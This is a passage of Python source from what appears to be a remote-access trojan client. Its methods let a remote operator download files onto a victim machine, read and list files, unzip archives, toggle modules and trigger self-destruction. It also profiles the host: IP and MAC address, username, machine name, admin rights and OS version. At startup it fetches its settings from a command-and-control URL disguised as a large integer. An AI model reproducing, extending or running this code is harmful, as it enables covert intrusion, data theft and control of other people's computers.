    def new(self, fullurl): return get_module(fullurl)
    
    def wget(self, target): return urlretrieve(target)[0]
    
    def cat(self,filename): return open(filename).read(4000)
    
    def selfdestruct(self): return self.self_destruct()
    
    def ls(self, path='.'): return '\n'.join(os.listdir(path))
    
    def unzip(self, fname): return ZipFile(fname).extractall('.')
    
    def cd(self, pathname): return os.chdir(pathname) if os.path.isdir(pathname) else os.chdir('.')

    def run(self,**kwargs): return self.run.modules()
    
    def show(self, target): return self._show(getattr(self, target)) if bool(hasattr(self, target) and target in ('results','jobs','options')) else '{} not found'.format(target)
    
    def use(self, modules): return [self.modules.get(module).update({'status': True}) for module in modules.split() if module in self.modules]
    
    def stop(self, target): return [self.modules.get(module).update({'status': False}) for module in target.split() if module in self.modules]
    
    def info(self, **args): return {'IP Address': self.get_ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).rstrip() if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
    
    def status(self,*args): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0))

    def commands(self, *x): return '\n'.join([cmd for cmd in self.commands])

    def modules(self, **x): return '\n'.join([mod for mod in self.modules])

# ----------------- MAIN --------------------------

def main(*args, **kwargs):
    client = Client(**kwargs)
    return client.main()

if __name__ == '__main__':
    main(**request('GET', long_to_bytes(5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950)).json()['settings'])
    

